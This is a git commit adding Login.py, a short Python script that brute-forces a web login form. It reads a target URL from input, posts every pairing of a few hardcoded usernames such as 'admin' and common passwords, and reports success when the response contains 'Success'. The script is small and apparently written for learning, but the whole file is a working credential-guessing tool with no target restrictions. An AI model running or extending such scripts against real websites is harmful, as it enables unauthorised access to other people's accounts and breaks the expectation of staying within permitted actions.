7968ca45eec35d819a464957e3c023cf80d3de61
mrtechghost <33446536+mrtechghost@users.noreply.github.com>
2023-11-20 08:03:58 +0530

    Create Login.py

---
+++ Python Request Scripts/Login.py
@@ -0,0 +1,23 @@
+#Simple login bruteforce script using lists
+import requests
+
+url=input("Lets check website : ")
+
+#using python inbuild list for wordlists
+username = ("admin","admin1","admin11")
+password = ("password","Pass","test")
+
+for i in username:
+    print (i)
+    for j in password:
+       credentials= {'Contact':i,'Pass':j}
+       print ("username: " + i + "\n Passowrd:" + j)
+       #passing data using request post
+       r = requests.post(url, data=credentials)
+       #using request text to get responce text and searching for success keyword in responce body
+       if "Success" in r.text:
+        print ("login successfull")
+       else : 
+        print("lets try onemore time")
+        
+    
